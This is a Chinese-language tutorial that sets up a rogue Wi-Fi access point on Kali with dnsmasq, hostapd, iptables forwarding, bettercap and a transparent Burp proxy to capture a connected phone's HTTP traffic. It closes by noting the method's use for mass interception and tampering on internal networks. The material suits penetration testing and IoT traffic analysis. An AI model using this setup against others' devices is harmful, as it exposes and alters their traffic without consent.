## 前期准备

kali系统、usb网卡、dnsmasq、hostapd、bettercap

## 软件安装

apt install dnsmasq

apt install hostapd

apt install bettercap

## 配置dnsmasq

修改文件/etc/dnsmasq.conf

    
    
    dhcp-range=192.168.0.50 192.168.0.150,12h
    interface=wlan0

## 配置hostapd

创建文件hostapd.cnf 内容为：

    
    
    interface=wlan0
    ssid=yudays
    driver=nl80211
    channel=1
    hw_mode=g

## 正式部署

将dnsmasq重启，使用命令

    
    
    service dnsmasq restart 

将usb网卡连接kali。在ifconfig命令下能查找到wlan0网卡。

配置wlan0网卡的ip

    
    
    ifconfig wlan0 192.168.0.1/24

执行./hostapd hostapd.cnf 。手机连接名为yudays的wifi。

此时手机连接的wifi并不能上网，需要配置wlan0转发到eth0的网卡上。转发操作

    
    
    sysctl -w net.ipv4.ip_forward=1
    iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

执行完后，手机可以通过wifi正常上网。

配置bettercap相关配置。执行

    
    
    sudo bettercap -iface wlan0

此时进入bettercap交互模式，类似msf的操作。执行

    
    
    set gateway.address 192.168.0.1
    net.probe on
    net.sniff on 
    any.proxy on

bettercap就配置完成了。

接下来配置burp。

配置监听端口及ip

![](https://image.3001.net/images/20210816/1629119027_611a62338fd95ec6f523b.jpg!small)

配置透传模式。

![](https://image.3001.net/images/20210816/1629119079_611a62674aec12d1dd6c6.jpg!small)

配置完之后，即可测试效果。

## 测试效果

手机在连接wifi下，未进行代理配置。访问freebuf官方网站：

手机截图：

![](https://image.3001.net/images/20210816/1629119418_611a63ba65c35c285a98d.jpg!small)

电脑端通过wifi拦截下来的数据包。

![1629119384_611a6398987b9baf74a97.png!small?1629119386441](https://image.3001.net/images/20210816/1629119384_611a6398987b9baf74a97.png!small?1629119386441)

## 总结

可通过该方式，进行内网大批量进行拦截数据包、篡改等操作。同时该方式也可用于IOT设备拦截http相关请求的数据包。

